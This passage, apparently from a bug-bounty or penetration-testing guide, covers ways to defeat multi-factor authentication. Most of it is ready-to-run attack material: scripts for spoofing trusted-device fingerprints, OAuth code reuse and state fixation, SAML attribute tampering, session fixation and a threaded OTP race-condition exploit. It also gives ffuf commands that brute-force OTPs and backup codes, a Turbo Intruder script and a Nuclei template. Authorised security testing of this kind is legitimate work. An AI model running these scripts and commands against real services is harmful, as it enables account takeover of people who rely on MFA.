        return hashlib.sha256(fp_string.encode()).hexdigest()[:32]

    def spoof_trusted_device(self, stolen_fingerprint):
        """Use stolen fingerprint to appear as trusted device"""
        headers = {
            'X-Device-Fingerprint': stolen_fingerprint,
            'X-Device-ID': stolen_fingerprint,
            'X-Browser-Fingerprint': stolen_fingerprint
        }
        return headers
```

---

## 6. Protocol-Level Bypasses

### 6.1 OAuth State Manipulation for MFA Bypass

**Attack Flow**:
```http
# Step 1: Start OAuth flow for victim account
GET /oauth/authorize?client_id=app&redirect_uri=https://app.com/callback&state=STATE1

# Step 2: Complete OAuth but capture callback before MFA
GET /callback?code=AUTHCODE&state=STATE1
# At this point, victim may need MFA

# Step 3: Use authorization code on different session (no MFA)
POST /oauth/token
{
    "code": "AUTHCODE",
    "client_id": "app",
    "client_secret": "secret",
    "redirect_uri": "https://app.com/callback"
}
```

**OAuth MFA Bypass Script**:
```python
#!/usr/bin/env python3
"""OAuth MFA Bypass Tester"""

import requests
import urllib.parse

class OAuthMFABypass:
    def __init__(self, oauth_config):
        self.config = oauth_config

    def test_code_without_mfa(self, auth_code):
        """Test if authorization code can be used without MFA completion"""
        # Exchange code for token
        resp = requests.post(
            self.config['token_url'],
            data={
                'grant_type': 'authorization_code',
                'code': auth_code,
                'client_id': self.config['client_id'],
                'client_secret': self.config['client_secret'],
                'redirect_uri': self.config['redirect_uri']
            }
        )

        if 'access_token' in resp.json():
            return {
                'vulnerable': True,
                'token': resp.json()['access_token']
            }
        return {'vulnerable': False}

    def test_state_fixation(self):
        """Test OAuth state fixation to bypass MFA"""
        # Generate OAuth URL with known state
        known_state = "attacker_controlled_state"
        oauth_url = f"{self.config['auth_url']}?client_id={self.config['client_id']}&redirect_uri={self.config['redirect_uri']}&state={known_state}&response_type=code"

        # If victim completes flow with this state, attacker can intercept
        return {
            'attack_url': oauth_url,
            'state': known_state
        }
```

---

### 6.2 SAML Assertion Injection

**SAML Response Manipulation**:
```xml
<!-- Original SAML Assertion -->
<saml:Assertion>
    <saml:AttributeStatement>
        <saml:Attribute Name="mfa_verified">
            <saml:AttributeValue>false</saml:AttributeValue>
        </saml:Attribute>
    </saml:AttributeStatement>
</saml:Assertion>

<!-- Modified Assertion (if signature not validated) -->
<saml:Assertion>
    <saml:AttributeStatement>
        <saml:Attribute Name="mfa_verified">
            <saml:AttributeValue>true</saml:AttributeValue>
        </saml:Attribute>
        <saml:Attribute Name="auth_level">
            <saml:AttributeValue>full</saml:AttributeValue>
        </saml:Attribute>
    </saml:AttributeStatement>
</saml:Assertion>
```

**SAML Testing with Burp**:
```
1. Install SAML Raider extension
2. Intercept SAML Response
3. Decode Base64 assertion
4. Modify MFA-related attributes
5. Re-encode and forward
6. Check if application accepts modified assertion
```

---

### 6.3 Session Fixation Post-MFA

**Attack Flow**:
```http
# Step 1: Attacker gets pre-auth session
GET /login HTTP/1.1

HTTP/1.1 200 OK
Set-Cookie: session=ATTACKER_SESSION

# Step 2: Victim completes full authentication with attacker's session
# (via session fixation attack - injected cookie)
POST /login HTTP/1.1
Cookie: session=ATTACKER_SESSION
{"username": "victim", "password": "pass"}

POST /mfa/verify HTTP/1.1
Cookie: session=ATTACKER_SESSION
{"otp": "123456"}

# Step 3: Attacker uses same session (now authenticated)
GET /dashboard HTTP/1.1
Cookie: session=ATTACKER_SESSION
```

**Session Fixation Tester**:
```python
#!/usr/bin/env python3
"""Session Fixation Post-MFA Tester"""

import requests

class SessionFixationTester:
    def __init__(self, base_url):
        self.base_url = base_url

    def get_session(self):
        """Get fresh session token"""
        resp = requests.get(f"{self.base_url}/login")
        return resp.cookies.get('session')

    def test_session_regeneration(self, username, password, otp):
        """Test if session is regenerated after auth steps"""
        session = requests.Session()

        # Get initial session
        session.get(f"{self.base_url}/login")
        initial_session = session.cookies.get('session')

        # After password auth
        session.post(f"{self.base_url}/login", json={
            "username": username,
            "password": password
        })
        post_password = session.cookies.get('session')

        # After MFA
        session.post(f"{self.base_url}/mfa/verify", json={"otp": otp})
        post_mfa = session.cookies.get('session')

        return {
            'initial': initial_session,
            'post_password': post_password,
            'post_mfa': post_mfa,
            'vulnerable': initial_session == post_mfa
        }
```

---

### 6.4 Race Condition Attacks

**Concept**: Exploit race conditions to bypass MFA or authenticate multiple sessions with single OTP.

**Race Condition Script**:
```python
#!/usr/bin/env python3
"""MFA Race Condition Exploit"""

import requests
import threading
import time

class MFARaceCondition:
    def __init__(self, target_url, session_cookie, valid_otp):
        self.target_url = target_url
        self.session_cookie = session_cookie
        self.valid_otp = valid_otp
        self.results = []

    def send_otp_request(self, thread_id):
        """Send OTP verification request"""
        session = requests.Session()
        try:
            resp = session.post(
                f"{self.target_url}/api/verify-otp",
                json={"otp": self.valid_otp},
                cookies={"session": self.session_cookie}
            )
            self.results.append({
                'thread': thread_id,
                'status': resp.status_code,
                'success': 'success' in resp.text.lower(),
                'session': resp.cookies.get('session')
            })
        except Exception as e:
            self.results.append({
                'thread': thread_id,
                'error': str(e)
            })

    def exploit(self, num_threads=20):
        """Run race condition attack"""
        threads = []

        # Create threads
        for i in range(num_threads):
            t = threading.Thread(target=self.send_otp_request, args=(i,))
            threads.append(t)

        # Start all threads simultaneously
        for t in threads:
            t.start()

        # Wait for completion
        for t in threads:
            t.join()

        # Analyze results
        successful = [r for r in self.results if r.get('success')]
        if len(successful) > 1:
            return {
                'vulnerable': True,
                'sessions': [r.get('session') for r in successful],
                'message': f'Got {len(successful)} authenticated sessions from 1 OTP'
            }
        return {'vulnerable': False}

# Turbo Intruder Script (Burp)
"""
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=True)

    # Send all requests at once
    for i in range(50):
        engine.queue(target.req, target.baseInput)

def handleResponse(req, interesting):
    if 'success' in req.response.lower():
        table.add(req)
"""
```

**Real-World Case Study** (HackerOne #759247):
> Shopify gift card race condition allowed multiple redemptions. Similar concept applied to MFA - multiple sessions authenticated with single code. Bounty: $6,000

---

## 7. Tool Commands Quick Reference

### Burp Suite Extensions
```
# Install these extensions for MFA testing:
- Turbo Intruder (race conditions)
- Auth Analyzer (session testing)
- SAML Raider (SAML manipulation)
- JWT Editor (token manipulation)
- Logger++ (detailed request logging)
```

### ffuf Commands
```bash
# OTP brute force
ffuf -w otp_wordlist.txt -X POST \
  -u https://target.com/api/verify-otp \
  -H "Content-Type: application/json" \
  -H "Cookie: session=TOKEN" \
  -d '{"otp":"FUZZ"}' \
  -fc 401 -mc 200

# Backup code brute force
ffuf -w backup_codes.txt -X POST \
  -u https://target.com/api/backup-code \
  -H "Content-Type: application/json" \
  -d '{"code":"FUZZ"}' \
  -fc 401
```

### Nuclei Templates
```yaml
# mfa-bypass.yaml
id: mfa-bypass-direct-access

info:
  name: MFA Bypass via Direct Access
  severity: critical

requests:
  - method: GET
    path:
      - "{{BaseURL}}/dashboard"
      - "{{BaseURL}}/api/user"
      - "{{BaseURL}}/account"
    headers:
      Cookie: "session={{session}}"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "dashboard"
          - "account"
          - "profile"
        condition: or
```

---

## 8. Bug Bounty Case Studies Summary

| Platform | Vulnerability | Impact | Bounty |
|----------|--------------|--------|--------|
| Instagram | Direct API access bypass | Account takeover | $15,000 |
| Microsoft | Rate limit bypass via headers | OTP brute force | $13,000 |
| Shopify | OTP in response body | Account takeover | $2,500 |
| Grammarly | Response manipulation | Full auth bypass | $5,000 |
| Twitter | SIM swap + social engineering | Account takeover | N/A (criminal) |
| Reddit | SMS interception | Employee account access | N/A (breach) |
| Shopify | Race condition | Multiple session auth | $6,000 |
| Various | OAuth state manipulation | MFA bypass | $3,000-$10,000 |

---

## 9. Testing Checklist

```
[ ] Direct endpoint access after partial auth
[ ] Step parameter manipulation
[ ] Response body/status code manipulation
[ ] Client-side auth state modification
[ ] OTP brute force (with rate limit bypass)
[ ] OTP reuse testing
[ ] OTP leakage in response/headers/cookies
[ ] OTP timing analysis
[ ] OTP generation pattern analysis
[ ] SMS-based 2FA weakness assessment
[ ] Backup code brute force
[ ] Recovery flow manipulation
[ ] Security question bypass
[ ] Device trust token manipulation
[ ] Session cookie binding verification
[ ] OAuth state/code manipulation
[ ] SAML assertion modification
[ ] Session fixation post-MFA
[ ] Race condition exploitation
```

---

## References

- OWASP Testing Guide - Multi-Factor Authentication
- PortSwigger Web Security Academy - Authentication
- HackerOne Hacktivity - MFA bypass reports
- Bugcrowd Vulnerability Disclosure - Authentication
- NIST SP 800-63B - Digital Identity Guidelines
